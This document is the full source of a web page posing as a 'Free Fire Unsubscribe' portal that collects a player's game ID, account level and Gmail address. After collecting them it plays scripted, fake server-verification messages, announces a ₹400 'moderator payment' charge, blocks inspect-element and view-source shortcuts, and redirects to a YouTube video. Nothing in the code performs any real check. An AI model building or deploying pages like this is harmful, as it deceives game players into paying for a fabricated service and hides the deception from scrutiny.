<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Free Fire Unsubscribe Portal</title>
    <style>
        /* Global Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: '-apple-system', BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
            user-select: none;
        }

        body {
            background-color: #0f0f13;
            background-image: radial-gradient(circle at 15% 50%, rgba(0, 255, 128, 0.15), transparent 25%),
                              radial-gradient(circle at 85% 30%, rgba(255, 0, 128, 0.15), transparent 25%);
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            overflow-x: hidden;
        }

        /* Container & Glassmorphism (Apple Liquid Glass Theme) */
        .container {
            width: 100%;
            max-width: 500px;
            perspective: 1000px;
        }

        .glass-panel {
            background: rgba(30, 30, 35, 0.4);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            padding: 35px 25px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5), inset 0 0 0 1px rgba(255, 255, 255, 0.05);
            position: relative;
            overflow: hidden;
            transition: transform 0.3s ease;
            min-height: 500px; /* Maintains size during transitions */
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        /* Shake Animation for Validation Error */
        @keyframes shakeError {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
            20%, 40%, 60%, 80% { transform: translateX(10px); }
        }

        .shake {
            animation: shakeError 0.5s cubic-bezier(.36,.07,.19,.97) both;
            border: 1px solid rgba(255, 51, 102, 0.5);
            box-shadow: 0 0 20px rgba(255, 51, 102, 0.3);
        }

        /* Header */
        header {
            text-align: center;
            margin-bottom: 25px;
        }

        h1 {
            font-size: 2.2rem;
            color: #00ff44;
            text-transform: uppercase;
            font-weight: 800;
            text-shadow: 0 0 15px rgba(0, 255, 68, 0.6), 0 0 30px rgba(0, 255, 68, 0.3);
            letter-spacing: 1px;
        }

        /* Form Elements */
        .form-group {
            margin-bottom: 20px;
            position: relative;
            width: 100%;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-size: 0.95rem;
            color: #a0a0a5;
            font-weight: 500;
            padding-left: 5px;
        }

        input, select {
            width: 100%;
            padding: 14px 18px;
            border-radius: 12px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            background: rgba(0, 0, 0, 0.3);
            color: #fff;
            font-size: 1rem;
            transition: all 0.3s ease;
            outline: none;
            appearance: none;
        }

        select {
            background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%23FFFFFF%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-5%200-9.3%201.8-12.9%205.4A17.6%2017.6%200%200%200%200%2082.2c0%205%201.8%209.3%205.4%2012.9l128%20127.9c3.6%203.6%207.8%205.4%2012.8%205.4s9.2-1.8%2012.8-5.4L287%2095c3.5-3.5%205.4-7.8%205.4-12.8%200-5-1.9-9.2-5.5-12.8z%22%2F%3E%3C%2Fsvg%3E");
            background-repeat: no-repeat;
            background-position: right 15px top 50%;
            background-size: 12px auto;
        }

        select option {
            background: #1e1e23;
            color: #fff;
        }

        input:focus, select:focus {
            border-color: #00ff44;
            box-shadow: 0 0 15px rgba(0, 255, 68, 0.2);
            background: rgba(0, 0, 0, 0.5);
        }

        input.input-error, select.input-error {
            border-color: #ff3366;
            box-shadow: 0 0 10px rgba(255, 51, 102, 0.3);
        }

        .error-msg {
            color: #ff3366;
            font-size: 0.85rem;
            margin-top: 5px;
            padding-left: 5px;
            font-weight: bold;
            display: none;
        }

        /* Button */
        .btn-submit {
            background: linear-gradient(135deg, #00ff44, #00b330);
            color: #000;
            border: none;
            padding: 16px;
            font-size: 1.2rem;
            border-radius: 12px;
            cursor: pointer;
            text-transform: uppercase;
            font-weight: 800;
            width: 100%;
            transition: all 0.3s ease;
            box-shadow: 0 10px 20px rgba(0, 255, 68, 0.3);
            margin-top: 15px;
            letter-spacing: 1px;
        }

        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 25px rgba(0, 255, 68, 0.4);
        }

        .btn-submit:active {
            transform: translateY(2px);
        }

        /* Smooth Processing Section (No Box) */
        .processing-container {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            width: 100%;
            height: 100%;
        }

        .process-log {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .log-entry {
            font-size: 1.1rem;
            font-weight: bold;
            opacity: 0;
            transform: translateY(20px);
            transition: all 0.5s cubic-bezier(0.25, 1, 0.5, 1);
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
        }

        .log-entry.visible {
            opacity: 1;
            transform: translateY(0);
        }

        .c-green { color: #00ff44; text-shadow: 0 0 15px rgba(0, 255, 68, 0.4); }
        .c-blue { color: #00ccff; text-shadow: 0 0 15px rgba(0, 204, 255, 0.4); }
        .c-yellow { color: #ffcc00; text-shadow: 0 0 15px rgba(255, 204, 0, 0.4); }

        /* Glowing Popup Text */
        .glowing-popup {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) scale(0.5);
            width: 100%;
            text-align: center;
            font-size: 2.2rem;
            font-weight: 900;
            color: #fff;
            text-transform: uppercase;
            text-shadow: 0 0 20px #00ff44, 0 0 40px #00ff44, 0 0 60px #00b330;
            opacity: 0;
            transition: all 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            z-index: 50;
        }

        .glowing-popup.show {
            opacity: 1;
            transform: translate(-50%, -50%) scale(1);
        }

        /* Original Transition Blinking Screen (No Drop Shadow) */
        .transition-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.95);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.5s ease;
        }

        .transition-screen.active {
            opacity: 1;
            pointer-events: all;
        }

        .transition-image {
            max-width: 15%;
            max-height: 15%;
            /* NO drop shadow added here, exact original effect */
        }

        @keyframes blinkImage {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.7; transform: scale(0.95); }
            100% { opacity: 1; transform: scale(1); }
        }

        .transition-image.blink {
            animation: blinkImage 1s infinite ease-in-out;
        }

        @media (max-width: 768px) {
            .transition-image { max-width: 25%; max-height: 25%; }
            h1 { font-size: 1.8rem; }
            .glowing-popup { font-size: 1.8rem; }
        }
    </style>
</head>
<body>

    <div class="transition-screen" id="transitionScreen">
        <img src="https://pending404.github.io/image/ff-loding.png" alt="Loading" class="transition-image" id="transitionImage">
    </div>

    <div class="container" id="mainContainer">
        <div class="glass-panel" id="glassPanel">
            
            <div id="formSection">
                <header>
                    <h1>Free Fire Unsubscribe</h1>
                </header>
                
                <form id="unsubscribeForm" novalidate>
                    
                    <div class="form-group">
                        <label>Free Fire Player ID</label>
                        <input type="text" id="uid" inputmode="numeric" placeholder="Please enter your UID" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                        <div class="error-msg" id="uidError">Please enter a valid Player ID.</div>
                    </div>

                    <div class="form-group">
                        <label>Your Device</label>
                        <select id="device">
                            <option value="" disabled selected>Choose your device</option>
                            <option value="Android">Android</option>
                            <option value="iPhone">iOS (iPhone)</option>
                            <option value="PC">PC (Emulator)</option>
                        </select>
                        <div class="error-msg" id="deviceError">Please select your device.</div>
                    </div>

                    <div class="form-group">
                        <label>Server Region</label>
                        <select id="server">
                            <option value="" disabled selected>Select your server</option>
                            <option value="India">India</option>
                            <option value="Bangladesh">Bangladesh</option>
                            <option value="Singapore">Singapore</option>
                            <option value="MENA">MENA</option>
                            <option value="Brazil">Brazil</option>
                        </select>
                        <div class="error-msg" id="serverError">Please select a server region.</div>
                    </div>

                    <div class="form-group">
                        <label>Reason for Unsubscribe</label>
                        <select id="reason">
                            <option value="" disabled selected>Select a reason...</option>
                            <option value="Galti se ho gaya unsubscribe">Galti se ho gaya unsubscribe</option>
                            <option value="Maine janbuj ke khud Kiya">Maine janbuj ke khud Kiya</option>
                            <option value="Kisi aur Ne Kar Diya">Kisi aur Ne Kar Diya</option>
                            <option value="Gmail compromise ho gaya tha">Gmail compromise ho gaya tha</option>
                            <option value="Mere ko pata nahin">Mere ko pata nahin</option>
                        </select>
                        <div class="error-msg" id="reasonError">Please select a reason.</div>
                    </div>

                    <div class="form-group">
                        <label>ID Level</label>
                        <input type="text" id="level" inputmode="numeric" placeholder="Enter ID Level" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                        <div class="error-msg" id="levelError">ID mismatch or Level not found.</div>
                    </div>

                    <div class="form-group">
                        <label>Unsubscribed Gmail ID</label>
                        <input type="email" id="gmail" placeholder="Enter email address">
                        <div class="error-msg" id="gmailError">Please enter a valid email address.</div>
                    </div>

                    <button type="button" class="btn-submit" id="proceedBtn">PROCEED</button>
                </form>
            </div>

            <div class="processing-container" id="processingSection">
                <div class="process-log" id="processLog">
                    </div>
            </div>

            <div class="glowing-popup" id="glowingPopup">
                Free Fire Gmail<br>Resubscribing
            </div>

        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            
            // Prevent inspect element
            document.addEventListener('contextmenu', event => event.preventDefault());
            document.onkeydown = function(e) {
                if(e.keyCode == 123) return false;
                if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) return false;
                if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
            }

            const proceedBtn = document.getElementById('proceedBtn');
            const glassPanel = document.getElementById('glassPanel');
            const formSection = document.getElementById('formSection');
            const processingSection = document.getElementById('processingSection');
            const processLog = document.getElementById('processLog');
            const glowingPopup = document.getElementById('glowingPopup');
            const transitionScreen = document.getElementById('transitionScreen');
            const transitionImage = document.getElementById('transitionImage');

            // Form validation logic
            proceedBtn.addEventListener('click', () => {
                let isValid = true;

                const uid = document.getElementById('uid');
                const device = document.getElementById('device');
                const server = document.getElementById('server');
                const reason = document.getElementById('reason');
                const level = document.getElementById('level');
                const gmail = document.getElementById('gmail');

                const uidError = document.getElementById('uidError');
                const deviceError = document.getElementById('deviceError');
                const serverError = document.getElementById('serverError');
                const reasonError = document.getElementById('reasonError');
                const levelError = document.getElementById('levelError');
                const gmailError = document.getElementById('gmailError');

                // Reset visual errors
                document.querySelectorAll('.input-error').forEach(el => el.classList.remove('input-error'));
                document.querySelectorAll('.error-msg').forEach(el => el.style.display = 'none');

                // Validations
                if (uid.value.length < 7 || uid.value.length > 16) {
                    uid.classList.add('input-error');
                    uidError.style.display = 'block';
                    isValid = false;
                }

                if (device.value === "") {
                    device.classList.add('input-error');
                    deviceError.style.display = 'block';
                    isValid = false;
                }

                if (server.value === "") {
                    server.classList.add('input-error');
                    serverError.style.display = 'block';
                    isValid = false;
                }

                if (reason.value === "") {
                    reason.classList.add('input-error');
                    reasonError.style.display = 'block';
                    isValid = false;
                }

                const lvlNum = parseInt(level.value);
                if (isNaN(lvlNum) || lvlNum < 11 || lvlNum > 95) {
                    level.classList.add('input-error');
                    levelError.style.display = 'block';
                    isValid = false;
                }

                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!emailRegex.test(gmail.value)) {
                    gmail.classList.add('input-error');
                    gmailError.style.display = 'block';
                    isValid = false;
                }

                if (!isValid) {
                    glassPanel.classList.remove('shake');
                    void glassPanel.offsetWidth; 
                    glassPanel.classList.add('shake');
                    
                    setTimeout(() => {
                        glassPanel.classList.remove('shake');
                    }, 500);
                    return; 
                }

                // If Valid -> Start sequence
                startSequence(uid.value, level.value, gmail.value);
            });

            function maskEmail(email) {
                let parts = email.split('@');
                let name = parts[0];
                let domain = parts[1];
                if(name.length > 2) {
                    return name[0] + '*******' + name[name.length - 1] + '@' + domain;
                } else {
                    return name[0] + '***@' + domain;
                }
            }

            function startSequence(uid, level, email) {
                const maskedEmail = maskEmail(email);

                // 1. Show Blinking Logo First
                transitionScreen.classList.add('active');
                transitionImage.classList.add('blink');

                setTimeout(() => {
                    // Hide Logo
                    transitionScreen.classList.remove('active');
                    transitionImage.classList.remove('blink');

                    // 2. Hide Form, Show Processing (Smooth Text)
                    formSection.style.display = 'none';
                    processingSection.style.display = 'flex';

                    runTextAnimations(uid, level, maskedEmail);

                }, 2000); // Wait 2 seconds with blinking logo
            }

            function runTextAnimations(uid, level, maskedEmail) {
                const logs = [
                    `<span class="c-blue">Connecting to Server...</span>`,
                    `<span class="c-green">UID Validated: ${uid}</span>`,
                    `<span class="c-yellow">Checking Account Level: ${level}</span>`,
                    `<span class="c-blue">Verifying Email Link:</span><br>${maskedEmail}`,
                    `<span class="c-green">All checks passed.</span>`,
                    `<span class="c-yellow" style="font-size: 0.95rem; margin-top: 10px;">Moderator payment charges: ₹400</span>`
                ];

                let index = 0;
                processLog.innerHTML = ""; // clear previous if any

                function appendLog() {
                    if (index < logs.length) {
                        const div = document.createElement('div');
                        div.className = 'log-entry';
                        div.innerHTML = logs[index];
                        processLog.appendChild(div);
                        
                        setTimeout(() => div.classList.add('visible'), 50);

                        index++;
                        let delay = Math.floor(Math.random() * 800) + 800;
                        setTimeout(appendLog, delay);
                    } else {
                        // 3. After text finishes, wait 1s, then show Popup
                        setTimeout(() => {
                            processLog.style.display = 'none'; // hide text
                            showGlowingPopup();
                        }, 1500);
                    }
                }

                setTimeout(appendLog, 500);
            }

            function showGlowingPopup() {
                // Show Glowing Popup
                glowingPopup.style.display = 'block';
                setTimeout(() => {
                    glowingPopup.classList.add('show');
                }, 50);

                // Wait 3 seconds, then Final Blinking Logo
                setTimeout(() => {
                    glowingPopup.classList.remove('show');
                    
                    setTimeout(() => {
                        glowingPopup.style.display = 'none';
                        // 4. Final Blinking Logo & Redirect
                        transitionScreen.classList.add('active');
                        transitionImage.classList.add('blink');

                        setTimeout(() => {
                            window.location.href = "https://youtu.be/DK_UsATwoxI?si=lLLHC_Sr5TxTiY2x";
                        }, 3000);

                    }, 500); // Wait for popup to fade out

                }, 3000);
            }
        });
    </script>
</body>
</html>
